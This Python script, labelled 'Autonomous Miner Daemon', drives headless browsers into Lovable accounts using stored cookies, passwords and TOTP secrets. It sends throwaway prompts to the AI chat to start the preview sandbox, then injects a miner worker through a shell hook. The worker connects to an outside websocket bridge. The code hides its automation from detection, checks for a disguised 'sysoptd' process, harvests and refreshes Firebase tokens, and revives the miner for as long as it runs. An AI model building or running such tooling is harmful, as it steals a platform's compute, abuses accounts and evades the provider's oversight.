#!/usr/bin/env python3
"""
Autonomous Miner Daemon
Thin wrapper: setup browser + state, then delegate to inject_miner + health_check_loop.
Adds token refresh + session state save on top. Runs forever.

Usage:
  CHIMERA_NO_PROXY=1 python3 -u daemon.py --session session-2 --project <id> --browser chromium
"""

import argparse
import asyncio
import json
import os
import sys
import time
import traceback
from pathlib import Path

SESSIONS_DIR = Path(os.environ.get(
    "CHIMERA_SESSIONS_DIR",
    "/home/alan/Documents/repos/automation-toolkit/scripts/sessions"))
BRIDGE_URL = "wss://chimera-bridge-production-0703.up.railway.app"

TOKEN_REFRESH_INTERVAL = 2400  # 40 min

# Script3 wake prompts only — NOT Build a debug terminal (that's script2).
WAKE_PROMPTS = ["say 'a'", "1+1?", "say 'x'", "2+2?", "echo ok"]


def ts():
    return time.strftime("%H:%M:%S", time.localtime())


def log(msg):
    print(f"[{ts()}] {msg}", flush=True)


# Revive is simple: refresh chat → wake cmd → wait → preview → inject → repeat
WAKE_ROUNDS = 5
WAKE_GOTO_MS = 45000
WAKE_SEL_MS = 10000
WAKE_AFTER_SEND_S = 12       # let sandbox spin after wake cmd
REVIVE_WALL_S = 420          # room for wake + wait + lovable + inject
REVIVE_LOVABLE_S = 180
FAIL_STREAK_RESTART = 3      # browser restart only after repeated full fails


async def _page_eval(page, js: str, timeout: float = 8.0):
    """page.evaluate with hard timeout — hung Chromium must not block forever."""
    return await asyncio.wait_for(page.evaluate(js), timeout=timeout)


async def send_wake_prompt(
    chat_page,
    chat_url: str | None = None,
    session_config: dict | None = None,
) -> bool:
    """Refresh chat → find composer → send trivial wake cmd → wait.

    Simple loop — no abort-on-eval-timeout. Keep refreshing until composer
    appears or rounds exhausted; outer health loop retries / restarts browser.
    """
    import random as _rand

    chat_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        '[data-testid="chat-composer-editor"] [role="textbox"]',
        '[data-testid="chat-composer-editor"]',
        'div.ProseMirror[contenteditable="true"]',
        '[role="textbox"][contenteditable="true"]',
    ]

    try:
        await asyncio.wait_for(chat_page.bring_to_front(), timeout=5)
    except Exception:
        pass

    chat_input = None
    for round_n in range(1, WAKE_ROUNDS + 1):
        # --- refresh chat (reload if already there, else goto) ---
        log(f"  Wake: refresh chat (round {round_n}/{WAKE_ROUNDS})")
        try:
            cur0 = chat_page.url or ""
        except Exception:
            cur0 = ""
        try:
            if chat_url and chat_url.rstrip("/") in cur0.split("?")[0]:
                await chat_page.reload(timeout=WAKE_GOTO_MS, wait_until="commit")
                log("  Wake: reloaded chat")
            elif chat_url:
                await chat_page.goto(
                    chat_url, timeout=WAKE_GOTO_MS, wait_until="commit")
                log("  Wake: goto chat")
        except Exception as e:
            log(f"  Wake: refresh error ({type(e).__name__}) — continue")
        await asyncio.sleep(5)  # SPA settle

        cur = ""
        try:
            cur = chat_page.url or ""
        except Exception:
            cur = ""
        log(f"  Wake: url={cur[:100]}")

        # Login wall → re-login then back
        on_login = "/login" in cur or "/auth" in cur
        if not on_login:
            try:
                body0 = await _page_eval(
                    chat_page,
                    "() => (document.body && document.body.innerText || '').slice(0, 300)",
                    timeout=5,
                )
                bl0 = (body0 or "").lower()
                if ("log in" in bl0 or "sign in" in bl0) and "password" in bl0:
                    on_login = True
            except Exception:
                pass
        if on_login and session_config:
            log("  Wake: login wall — re-login")
            ok = await do_login(
                chat_page,
                session_config.get("email", ""),
                session_config.get("password", ""),
                session_config.get("totp_secret"),
            )
            if not ok:
                log("  Wake: re-login failed")
                continue
            if chat_url:
                try:
                    await chat_page.goto(
                        chat_url, timeout=WAKE_GOTO_MS, wait_until="commit")
                except Exception:
                    pass
                await asyncio.sleep(5)

        # Skip-to-chat if present
        try:
            skip = chat_page.get_by_text("Skip to chat input", exact=False)
            n = await asyncio.wait_for(skip.count(), timeout=3)
            if n > 0:
                await skip.first.click(timeout=3000)
                await asyncio.sleep(1)
                log("  Wake: clicked Skip to chat input")
        except Exception:
            pass

        for sel in chat_selectors:
            try:
                loc = chat_page.locator(sel).first
                await loc.wait_for(state="visible", timeout=WAKE_SEL_MS)
                chat_input = loc
                break
            except Exception:
                continue
        if chat_input:
            log(f"  Wake: chat input found (round {round_n})")
            break

        log(f"  Wake: no composer yet — refresh again")
        await asyncio.sleep(2)

    if not chat_input:
        log(f"  Wake: chat input not found after {WAKE_ROUNDS} refreshes")
        return False

    prompt = _rand.choice(WAKE_PROMPTS)
    log(f"  Wake: sending '{prompt}'")
    try:
        await chat_input.click(timeout=5000)
    except Exception:
        pass
    typed = False
    try:
        await chat_input.fill(prompt, timeout=10000)
        typed = True
    except Exception as e:
        log(f"  Wake fill failed ({e}) — keyboard type")
        try:
            await chat_page.keyboard.type(prompt, delay=25)
            typed = True
        except Exception as e2:
            log(f"  Wake type failed: {e2}")
            return False
    if not typed:
        return False
    await asyncio.sleep(0.3)
    try:
        send_btn = chat_page.locator(
            'button[data-testid="chat-input-send"], button[aria-label*="Send" i]'
        ).first
        if await send_btn.count() and await send_btn.is_visible(timeout=2000):
            await send_btn.click()
        else:
            await chat_page.keyboard.press("Enter")
    except Exception:
        try:
            await chat_page.keyboard.press("Enter")
        except Exception:
            pass
    log(f"  Wake: sent — waiting {WAKE_AFTER_SEND_S}s for sandbox")
    await asyncio.sleep(WAKE_AFTER_SEND_S)
    return True


async def wait_for_lovable_console(preview_page, timeout_seconds: int = 300) -> bool:
    """
    Keep refreshing preview until console shows 'lovable' (sandbox up).
    Also accepts window.lovable / callable window.doc. Matches script3 gate.
    """
    log(f"Waiting for console 'lovable' (refresh every 40s, max {timeout_seconds}s)...")
    seen = {"hit": False}

    def _on_console(msg):
        try:
            if "lovable" in (msg.text or "").lower():
                seen["hit"] = True
        except Exception:
            pass

    try:
        preview_page.on("console", _on_console)
    except Exception:
        pass

    start = asyncio.get_running_loop().time()
    refresh_interval = 15  # unused — loop paces itself with short sleeps
    while True:
        elapsed = asyncio.get_running_loop().time() - start
        if elapsed > timeout_seconds:
            log(f"  Timeout waiting for lovable console after {timeout_seconds}s")
            return False

        try:
            body = await _page_eval(
                preview_page,
                "() => (document.body && document.body.innerText) || ''",
                timeout=8,
            )
        except Exception:
            body = ""
        cur_url = ""
        try:
            cur_url = preview_page.url or ""
        except Exception:
            pass
        on_auth_bridge = "auth-bridge" in cur_url
        proxy_dead = "proxy error" in body.lower() and "404" in body
        on_preview = (
            "lovableproject.com" in cur_url
            or "webcontainer" in cur_url.lower()
            or cur_url.startswith("https://lovable-")
        )

        js_ready = ""
        if not proxy_dead and not on_auth_bridge and on_preview:
            try:
                js_ready = await _page_eval(
                    preview_page,
                    """() => {
                        if (window.lovable) return 'lovable-obj';
                        if (window.doc && typeof window.doc === 'function') return 'doc';
                        return '';
                    }""",
                    timeout=8,
                )
            except Exception as e:
                log(f"  ready-check error: {type(e).__name__}")

        if on_auth_bridge:
            log(f"  Still on auth-bridge — waiting (no reload) ({int(elapsed)}s)")
            # Let auth-bridge finish; reload interrupts the handoff.
            if elapsed > 90:
                try:
                    from urllib.parse import urlparse, parse_qs, unquote
                    qs = parse_qs(urlparse(cur_url).query)
                    ret = unquote((qs.get("return_url") or [""])[0])
                    if ret:
                        log(f"  auth-bridge stalled — goto return_url")
                        await preview_page.goto(ret, timeout=30000, wait_until="commit")
                    else:
                        await preview_page.reload(timeout=30000, wait_until="commit")
                except Exception as e:
                    log(f"  auth-bridge escape error: {e}")
                await asyncio.sleep(8)
            else:
                await asyncio.sleep(8)
            continue

        if on_preview and not on_auth_bridge and js_ready:
            # Require window.doc / window.lovable — console "lovable" alone is a
            # false positive (seen after proxy recovery before shell mounts).
            log(
                f"  Lovable ready (console={seen['hit']} js={js_ready} "
                f"url={cur_url[:80]}) after {int(elapsed)}s"
            )
            return True

        if on_preview and not on_auth_bridge and seen["hit"] and not js_ready:
            log(f"  Console lovable but no doc yet — keep waiting ({int(elapsed)}s)")
            await asyncio.sleep(5)
            continue

        if proxy_dead:
            log(f"  Preview proxy 404 — refreshing ({int(elapsed)}s)")
        else:
            log(f"  Refreshing preview... ({int(elapsed)}s)")

        try:
            # commit — "load" often never fires on lovableproject preview
            await preview_page.reload(timeout=20000, wait_until="commit")
        except Exception as e:
            log(f"  Refresh error: {type(e).__name__}")
            # Hard re-nav if reload hung/failed
            try:
                u = preview_page.url or ""
                if "lovableproject.com" in u:
                    await preview_page.goto(u.split("?")[0], timeout=20000, wait_until="commit")
            except Exception:
                pass
        await asyncio.sleep(8)


async def revive_sandbox(
    chat_page,
    preview_page,
    bridge_url: str,
    threads: int,
    chat_url: str | None = None,
    preview_url: str | None = None,
    session_config: dict | None = None,
) -> bool:
    """
    Simple recovery loop:
      refresh chat → send wake cmd → wait → goto preview → wait doc → inject
    """
    from miner_injector import inject_miner

    log("  Revive: refresh chat → wake → wait → preview → inject")
    woke = await send_wake_prompt(
        chat_page, chat_url=chat_url, session_config=session_config)
    if not woke:
        log("  Revive: wake failed — retry next cycle")
        return False

    # Preview: hard re-nav then wait for window.doc
    if preview_url:
        try:
            log(f"  Revive: goto preview")
            await preview_page.goto(preview_url, timeout=30000, wait_until="commit")
        except Exception as e:
            log(f"  Revive: preview goto error: {e}")
    try:
        await preview_page.bring_to_front()
    except Exception:
        pass

    ready = await wait_for_lovable_console(
        preview_page, timeout_seconds=REVIVE_LOVABLE_S)
    if not ready:
        log("  Revive: no doc yet — wake again + wait")
        await send_wake_prompt(
            chat_page, chat_url=chat_url, session_config=session_config)
        if preview_url:
            try:
                await preview_page.goto(preview_url, timeout=30000, wait_until="commit")
            except Exception:
                pass
        try:
            await preview_page.bring_to_front()
        except Exception:
            pass
        ready = await wait_for_lovable_console(
            preview_page, timeout_seconds=REVIVE_LOVABLE_S)
    if not ready:
        log("  Revive: lovable/doc never ready")
        return False

    log("  Revive: injecting worker")
    ok = await inject_miner(preview_page, bridge_url, threads)
    log(f"  Revive inject: {'OK' if ok else 'FAILED'}")
    return bool(ok)


async def shell_worker_status(preview_page) -> tuple[bool, str]:
    """
    True only when preview is live, /__shell (window.doc) works, AND sysoptd runs.
    Proxy 404 / auth-bridge / missing doc / zero workers → False (full revive).
    """
    cur_url = ""
    try:
        cur_url = preview_page.url or ""
    except Exception as e:
        return False, f"url-error:{e}"
    if "auth-bridge" in cur_url:
        return False, "auth-bridge"
    if "/login" in cur_url:
        return False, "login"

    try:
        body = await _page_eval(
            preview_page,
            "() => (document.body && document.body.innerText) || ''",
            timeout=8,
        )
        bl = body.lower()
        if ("proxy error" in bl or "lovable proxy error" in bl) and "404" in bl:
            return False, "proxy-404"
    except Exception as e:
        return False, f"body-error:{type(e).__name__}"

    try:
        has_doc = await _page_eval(
            preview_page,
            "() => !!(window.doc && typeof window.doc === 'function')",
            timeout=8,
        )
    except Exception as e:
        return False, f"doc-eval-error:{type(e).__name__}"
    if not has_doc:
        return False, "nodoc"

    # Zombie: doc still present but proxy message also in body (race)
    try:
        body2 = await _page_eval(
            preview_page,
            "() => (document.body && document.body.innerText) || ''",
            timeout=8,
        )
        if "404" in body2 and "proxy" in body2.lower():
            return False, "proxy-404-zombie"
    except Exception:
        pass

    try:
        probe = await _page_eval(
            preview_page,
            """async () => {
            try {
                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
                return r && r.stdout !== undefined ? r.stdout.trim() : 'no-probe';
            } catch(e) { return 'probe-error'; }
        }""",
            timeout=15,
        )
    except Exception as e:
        return False, f"probe-eval-error:{type(e).__name__}"

    if str(probe).isdigit() and int(probe) > 0:
        return True, str(probe)
    return False, f"worker-missing:{probe}"


def _sess_dir(session_id):
    if session_id.startswith("session-"):
        return SESSIONS_DIR / session_id
    return SESSIONS_DIR / f"session-{session_id}"


def load_cookies_sync(session_id):
    with open(_sess_dir(session_id) / "cookies.json") as f:
        return json.load(f)


def load_config_sync(session_id):
    with open(_sess_dir(session_id) / "config.json") as f:
        return json.load(f)


async def save_trio(context, page, session_id):
    """Save cookies + localStorage + IndexedDB to disk."""
    sdir = _sess_dir(session_id)
    try:
        cookies = await context.cookies()
        with open(sdir / "cookies.json", "w") as f:
            json.dump(cookies, f, indent=2)
        log(f"  Saved {len(cookies)} cookies")
    except Exception as e:
        log(f"  cookies save failed: {e}")
    try:
        ls = await page.evaluate("""() => {
            const o = {};
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                o[k] = localStorage.getItem(k);
            }
            return o;
        }""")
        with open(sdir / "localstorage.json", "w") as f:
            json.dump(ls, f, indent=2)
        log(f"  Saved {len(ls)} localStorage keys")
    except Exception as e:
        log(f"  localStorage save failed: {e}")
    try:
        idb = await asyncio.wait_for(page.evaluate("""async () => {
            return new Promise((resolve) => {
                try {
                    const req = indexedDB.open('firebaseLocalStorageDb');
                    const done = (v) => { try { resolve(v); } catch(e) {} };
                    const t = setTimeout(() => done([]), 12000);
                    req.onsuccess = () => {
                        try {
                            const db = req.result;
                            const stores = Array.from(db.objectStoreNames);
                            if (!stores.length) { clearTimeout(t); done([]); return; }
                            const tx = db.transaction(stores, 'readonly');
                            const out = [];
                            let pending = stores.length;
                            stores.forEach(sn => {
                                try {
                                    const rq = tx.objectStore(sn).getAll();
                                    rq.onsuccess = () => {
                                        rq.result.forEach(r => out.push({store: sn, key: r.fkey || r.key, value: r.value}));
                                        if (--pending === 0) { clearTimeout(t); done(out); }
                                    };
                                    rq.onerror = () => { if (--pending === 0) { clearTimeout(t); done(out); } };
                                } catch(e) { if (--pending === 0) { clearTimeout(t); done(out); } }
                            });
                        } catch(e) { clearTimeout(t); done([]); }
                    };
                    req.onerror = () => { clearTimeout(t); done([]); };
                } catch(e) { resolve([]); }
            });
        }"""), timeout=15)
        with open(sdir / "indexeddb.json", "w") as f:
            json.dump(idb, f, indent=2)
        has_ref = any(
            r.get("value", {}).get("stsTokenManager", {}).get("refreshToken")
            for r in idb if isinstance(r.get("value"), dict))
        log(f"  Saved {len(idb)} IndexedDB records, refresh_token={'YES' if has_ref else 'MISSING'}")
    except asyncio.TimeoutError:
        log("  IndexedDB save timed out — continuing with cookies+localStorage")
    except Exception as e:
        log(f"  IndexedDB save failed: {e}")


async def refresh_firebase_token(page):
    """Refresh Firebase access token via refresh token. Returns True if ok."""
    try:
        # Hard timeout — wedged Chromium previously held page_lock for ~17 min
        result = await asyncio.wait_for(page.evaluate("""async () => {
            return new Promise((resolve) => {
                try {
                    const req = indexedDB.open('firebaseLocalStorageDb');
                    const done = (v) => { try { resolve(v); } catch(e) {} };
                    const t = setTimeout(() => done({status: 'timeout'}), 12000);
                    req.onsuccess = () => {
                        const db = req.result;
                        const tx = db.transaction('firebaseLocalStorage', 'readwrite');
                        const store = tx.objectStore('firebaseLocalStorage');
                        const getAll = store.getAll();
                        getAll.onsuccess = async () => {
                            for (const r of getAll.result) {
                                const v = r.value;
                                if (v && v.stsTokenManager && v.stsTokenManager.refreshToken) {
                                    const now = Date.now();
                                    const exp = v.stsTokenManager.expirationTime || 0;
                                    if (exp > now + 60000) {
                                        clearTimeout(t);
                                        done({status: 'fresh', exp});
                                        return;
                                    }
                                    try {
                                        const resp = await fetch(
                                            'https://securetoken.googleapis.com/v1/token?key=' + v.apiKey,
                                            {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                                             body: 'grant_type=refresh_token&refresh_token=' + v.stsTokenManager.refreshToken});
                                        const data = await resp.json();
                                        if (data.access_token) {
                                            v.stsTokenManager.accessToken = data.access_token;
                                            v.stsTokenManager.expirationTime = Date.now() + (parseInt(data.expires_in || '3600') * 1000);
                                            if (data.refresh_token) v.stsTokenManager.refreshToken = data.refresh_token;
                                            store.put({fkey: r.fkey, value: v});
                                            clearTimeout(t);
                                            done({status: 'refreshed', exp: v.stsTokenManager.expirationTime});
                                        } else { clearTimeout(t); done({status: 'failed'}); }
                                    } catch(e) { clearTimeout(t); done({status: 'error'}); }
                                    return;
                                }
                            }
                            clearTimeout(t);
                            done({status: 'no_token'});
                        };
                        getAll.onerror = () => { clearTimeout(t); done({status: 'db_error'}); };
                    };
                    req.onerror = () => { clearTimeout(t); done({status: 'db_open_failed'}); };
                } catch(e) { resolve({status: 'error'}); }
            });
        }"""), timeout=20)
        status = result.get("status", "unknown")
        if status in ("fresh", "refreshed"):
            log(f"  Token {status} (exp={result.get('exp', '?')})")
            return True
        else:
            log(f"  Token issue: {status}")
            return False
    except asyncio.TimeoutError:
        log("  Token refresh timed out (20s) — continuing")
        return False
    except Exception as e:
        log(f"  Token refresh error: {e}")
        return False


async def do_login(page, email, password, totp_secret=None):
    """Full email+password+TOTP login. Returns True on success."""
    try:
        await page.goto("https://lovable.dev/login?redirect=%2Fdashboard", timeout=30000, wait_until="commit")
    except Exception:
        pass
    await page.wait_for_timeout(3000)

    if "/dashboard" in page.url or "/projects" in page.url:
        log("  Already logged in")
        return True

    try:
        await page.locator('input[placeholder="Email"]').fill(email)
        await page.locator('[data-testid="auth-submit-button"]').click()
        await page.wait_for_timeout(3000)
    except Exception as e:
        log(f"  Email step failed: {e}")
        return False

    try:
        await page.locator('input[placeholder="Password"]').fill(password)
        await page.locator('[data-testid="auth-submit-button"]').click()
        await page.wait_for_timeout(6000)
    except Exception as e:
        log(f"  Password step failed: {e}")
        return False

    try:
        body = await page.evaluate("() => document.body.innerText.slice(0, 500)")
    except Exception:
        body = ""

    if ("verification" in body.lower() or "two-factor" in body.lower() or "authenticator" in body.lower()) and totp_secret:
        log("  2FA detected, filling TOTP...")
        import pyotp
        code = pyotp.TOTP(totp_secret).now()
        try:
            inp = page.locator('input[inputmode="numeric"], input[autocomplete="one-time-code"]').first
            await inp.wait_for(state="visible", timeout=8000)
            await inp.fill(code)
            await page.wait_for_timeout(1000)
            await page.get_by_role("button", name="Verify").click(timeout=5000)
            await page.wait_for_timeout(6000)
        except Exception as e:
            log(f"  TOTP error: {e}")

    url = page.url
    if "/login" in url:
        try:
            body = await page.evaluate("() => document.body.innerText.slice(0, 200)")
        except Exception:
            body = ""
        if "Log in" in body[:200]:
            log("  Login failed")
            return False

    log("  Login successful")
    return True


async def run_daemon(session_id, project_id, browser_type, threads, mode, headed=False):
    from playwright.async_api import async_playwright
    from miner_injector import inject_miner

    config = load_config_sync(session_id)
    log(f"Session: {session_id} ({config.get('email', '?')})")
    log(f"Project: {project_id}")
    log(f"Browser: {browser_type} headed={headed}")

    preview_url = f"https://{project_id}.lovableproject.com"
    chat_url = f"https://lovable.dev/projects/{project_id}"

    while True:  # outer forever loop — relaunches browser on catastrophic failure
        pw = await async_playwright().start()
        try:
            # Launch browser
            if browser_type == "chromium":
                browser = await pw.chromium.launch(
                    headless=not headed,
                    args=["--no-sandbox", "--disable-dev-shm-usage",
                           "--disable-blink-features=AutomationControlled"])
            else:
                browser = await pw.firefox.launch(headless=not headed)

            context = await browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

            # Load cookies
            cookies = load_cookies_sync(session_id)
            await context.add_cookies(cookies)
            log(f"Loaded {len(cookies)} cookies")

            # --- Step 1: Open chat page, check login ---
            chat_page = await context.new_page()
            log(f"Opening chat: {chat_url}")
            try:
                await chat_page.goto(chat_url, timeout=30000, wait_until="commit")
            except Exception:
                pass
            await chat_page.wait_for_timeout(3000)

            # Check if logged in
            cur_url = chat_page.url
            if "/login" in cur_url:
                log("Not logged in — doing login...")
                ok = await do_login(
                    chat_page,
                    config["email"],
                    config["password"],
                    config.get("totp_secret"))
                if not ok:
                    log("Login failed — retrying in 5 min...")
                    await browser.close()
                    await pw.stop()
                    await asyncio.sleep(300)
                    continue
                # Reload chat after login
                try:
                    await chat_page.goto(chat_url, timeout=30000, wait_until="commit")
                except Exception:
                    pass
                await chat_page.wait_for_timeout(3000)

            # --- Step 2: Restore localStorage + IndexedDB ---
            sdir = _sess_dir(session_id)
            # Restore on chat page (lovable.dev domain)
            ls_file = sdir / "localstorage.json"
            if ls_file.exists():
                try:
                    with open(ls_file) as f:
                        ls_data = json.load(f)
                    await chat_page.evaluate(
                        "(data) => { for (const [k, v] of Object.entries(data)) { try { localStorage.setItem(k, v); } catch(e) {} } }",
                        ls_data)
                    log(f"Restored {len(ls_data)} localStorage keys")
                except Exception as e:
                    log(f"localStorage restore failed: {e}")

            idb_file = sdir / "indexeddb.json"
            if idb_file.exists():
                try:
                    with open(idb_file) as f:
                        idb_data = json.load(f)
                    if idb_data:
                        # deleteDatabase can hang onblocked — hard timeout (problem 7)
                        n = await asyncio.wait_for(
                            chat_page.evaluate("""(records) => {
                            return new Promise((resolve) => {
                                const done = (v) => { try { resolve(v); } catch(e) {} };
                                const t = setTimeout(() => done(-2), 12000);
                                try {
                                    const delReq = indexedDB.deleteDatabase('firebaseLocalStorageDb');
                                    delReq.onsuccess = delReq.onerror = delReq.onblocked = () => {
                                        const openReq = indexedDB.open('firebaseLocalStorageDb');
                                        openReq.onupgradeneeded = () => {
                                            try {
                                                openReq.result.createObjectStore('firebaseLocalStorage', {keyPath: 'fkey'});
                                            } catch(e) {}
                                        };
                                        openReq.onsuccess = () => {
                                            try {
                                                const db = openReq.result;
                                                const tx = db.transaction('firebaseLocalStorage', 'readwrite');
                                                const store = tx.objectStore('firebaseLocalStorage');
                                                let finished = 0;
                                                if (!records.length) { clearTimeout(t); done(0); return; }
                                                records.forEach(r => {
                                                    try {
                                                        const putReq = store.put({fkey: r.key, value: r.value});
                                                        putReq.onsuccess = putReq.onerror = () => {
                                                            if (++finished === records.length) { clearTimeout(t); done(finished); }
                                                        };
                                                    } catch(e) {
                                                        if (++finished === records.length) { clearTimeout(t); done(finished); }
                                                    }
                                                });
                                            } catch(e) { clearTimeout(t); done(-1); }
                                        };
                                        openReq.onerror = () => { clearTimeout(t); done(-1); };
                                    };
                                } catch(e) { clearTimeout(t); done(-1); }
                            });
                        }""", idb_data),
                            timeout=15,
                        )
                        log(f"Restored IndexedDB result={n} ({len(idb_data)} records)")
                except asyncio.TimeoutError:
                    log("IndexedDB restore timed out — continuing without it")
                except Exception as e:
                    log(f"IndexedDB restore failed: {e}")

            # --- Step 3: Find chat input and send wake prompt (script3 trivial, not debug-terminal) ---
            import random as _rand
            chat_input = None
            for round_n in range(1, 4):
                for sel in [
                    'div[contenteditable="true"][role="textbox"]',
                    '[data-testid="chat-composer-editor"] [role="textbox"]',
                    '[contenteditable="true"]',
                    "textarea",
                ]:
                    try:
                        loc = chat_page.locator(sel).first
                        await loc.wait_for(state="visible", timeout=8000)
                        chat_input = loc
                        break
                    except Exception:
                        continue
                if chat_input:
                    log(f"Chat input found (round {round_n})")
                    break
                log(f"Chat input missing (round {round_n}/3) — refreshing chat...")
                try:
                    await chat_page.reload(timeout=30000)
                except Exception:
                    try:
                        await chat_page.goto(chat_url, timeout=30000, wait_until="commit")
                    except Exception:
                        pass
                await chat_page.wait_for_timeout(5000)

            if not chat_input:
                log("Chat input not found — retrying in 5 min...")
                await browser.close()
                await pw.stop()
                await asyncio.sleep(300)
                continue

            prompt = _rand.choice(WAKE_PROMPTS)
            log(f"Sending wake prompt: '{prompt}'")
            await chat_input.fill(prompt)
            await asyncio.sleep(0.3)
            await chat_page.keyboard.press("Enter")
            log("Wake prompt sent!")

            # --- Step 4: Open preview in new tab ---
            preview_page = await context.new_page()
            log(f"Opening preview: {preview_url}")
            try:
                await preview_page.goto(preview_url, timeout=30000, wait_until="commit")
            except Exception:
                pass
            await preview_page.wait_for_timeout(3000)

            # --- Step 5: Refresh until console 'lovable' (sandbox ready) ---
            sandbox_ready = await wait_for_lovable_console(preview_page, timeout_seconds=300)

            if not sandbox_ready:
                log("Lovable console never ready — second wake + wait...")
                await send_wake_prompt(
                    chat_page, chat_url=chat_url, session_config=config)
                try:
                    await preview_page.bring_to_front()
                except Exception:
                    pass
                sandbox_ready = await wait_for_lovable_console(preview_page, timeout_seconds=300)

            if not sandbox_ready:
                log("Sandbox never ready — retrying in 2 min...")
                await browser.close()
                await pw.stop()
                await asyncio.sleep(120)
                continue

            # --- Step 6: Inject worker ---
            log("Injecting worker...")
            ok = await inject_miner(preview_page, BRIDGE_URL, threads)
            if ok:
                log("Worker injected!")
            else:
                log("Worker injection returned False — health loop will retry")

            # Save state from chat origin (Firebase LS/IDB live on lovable.dev,
            # not the preview sandbox — saving from preview wipes the trio).
            await save_trio(context, chat_page, session_id)

            if mode != "full":
                log(f"Mode={mode} — inject done, exiting (no health loop)")
                await browser.close()
                await pw.stop()
                return

            # Full mode: forever health — shell/worker dead → same as first run
            log("Starting health check loop (full mode)...")
            last_refresh = time.time()
            page_lock = asyncio.Lock()  # serialize revive vs token refresh

            async def daemon_health_loop():
                """On shell/worker death: wake chat → lovable console → inject."""
                iteration = 0
                fail_streak = 0
                while True:
                    iteration += 1
                    log(f"Health check #{iteration}...")
                    next_wait = 180
                    try:
                        alive, detail = await asyncio.wait_for(
                            shell_worker_status(preview_page), timeout=30)
                        if alive:
                            fail_streak = 0
                            log(f"  Worker alive (probe: {detail})")
                            log("  Preview healthy")
                        else:
                            log(f"  Shell/worker dead ({detail}) — full revive")
                            try:
                                if page_lock.locked():
                                    log("  waiting for page_lock (token refresh?)...")
                                async with page_lock:
                                    # Cap revive wall-clock so a wedged page can't stall forever
                                    ok = await asyncio.wait_for(
                                        revive_sandbox(
                                            chat_page,
                                            preview_page,
                                            BRIDGE_URL,
                                            threads,
                                            chat_url=chat_url,
                                            preview_url=preview_url,
                                            session_config=config,
                                        ),
                                        timeout=REVIVE_WALL_S,
                                    )
                                if ok:
                                    fail_streak = 0
                                    await save_trio(context, chat_page, session_id)
                                    log("  Revive OK")
                                else:
                                    fail_streak += 1
                                    log(f"  Revive failed (streak={fail_streak}) — retry sooner")
                                    next_wait = 30
                                    if fail_streak >= FAIL_STREAK_RESTART:
                                        log(f"  Revive failed {FAIL_STREAK_RESTART}x — restarting browser")
                                        return
                            except asyncio.TimeoutError:
                                fail_streak += 1
                                log(f"  Revive timed out {REVIVE_WALL_S}s (streak={fail_streak}) — retry sooner")
                                next_wait = 30
                                if fail_streak >= FAIL_STREAK_RESTART:
                                    log(f"  Revive failed {FAIL_STREAK_RESTART}x — restarting browser")
                                    return
                            except Exception as e2:
                                fail_streak += 1
                                log(f"  Revive error: {e2} (streak={fail_streak})")
                                next_wait = 30
                                if fail_streak >= FAIL_STREAK_RESTART:
                                    log(f"  Revive failed {FAIL_STREAK_RESTART}x — restarting browser")
                                    return

                        try:
                            import random as _r
                            await preview_page.mouse.move(
                                _r.randint(100, 800), _r.randint(100, 500))
                            await asyncio.sleep(0.5)
                        except Exception:
                            pass

                    except asyncio.TimeoutError:
                        fail_streak += 1
                        log(f"  Health probe timed out 30s (streak={fail_streak})")
                        next_wait = 30
                        if fail_streak >= FAIL_STREAK_RESTART:
                            log(f"  Probe dead {FAIL_STREAK_RESTART}x — restarting browser")
                            return
                    except Exception as e:
                        log(f"  Health check error: {e}")
                        next_wait = 30
                        fail_streak += 1
                        if fail_streak >= FAIL_STREAK_RESTART:
                            log(f"  Health errors {FAIL_STREAK_RESTART}x — restarting browser")
                            return

                    log(f"  Next check in {next_wait}s...")
                    await asyncio.sleep(next_wait)

            health_task = asyncio.create_task(daemon_health_loop())

            # Token refresh — never overlap with revive (same chat page)
            while not health_task.done():
                await asyncio.sleep(60)
                now = time.time()
                if now - last_refresh >= TOKEN_REFRESH_INTERVAL:
                    if page_lock.locked():
                        log("--- TOKEN REFRESH skipped (revive in progress) ---")
                        continue
                    log("--- TOKEN REFRESH ---")
                    async with page_lock:
                        tok_ok = await refresh_firebase_token(chat_page)
                        if tok_ok:
                            await save_trio(context, chat_page, session_id)
                    last_refresh = now

            # health_check_loop returned — restart browser ASAP (wedged page)
            log("Health loop exited — restarting in 5s...")
            try:
                await browser.close()
            except Exception:
                pass
            await asyncio.sleep(5)

        except Exception as e:
            log(f"Daemon error: {e}")
            traceback.print_exc()
            try:
                await browser.close()
            except Exception:
                pass
        finally:
            try:
                await pw.stop()
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(description="Autonomous Miner Daemon")
    parser.add_argument("--session", required=True, help="Session (e.g. session-2 or 2)")
    parser.add_argument("--project", required=True, help="Lovable project ID")
    parser.add_argument("--browser", default="chromium", choices=["chromium", "firefox"])
    parser.add_argument("--threads", type=int, default=64)
    parser.add_argument("--mode", default="full", choices=["full", "oneshot", "gh"])
    parser.add_argument("--headed", action="store_true",
                        help="Show browser window (local diagnose)")
    args = parser.parse_args()
    headed = args.headed or os.environ.get("CHIMERA_HEADED", "") == "1"

    try:
        asyncio.run(run_daemon(
            args.session, args.project, args.browser, args.threads, args.mode, headed=headed))
    except KeyboardInterrupt:
        log("Interrupted")


if __name__ == "__main__":
    main()
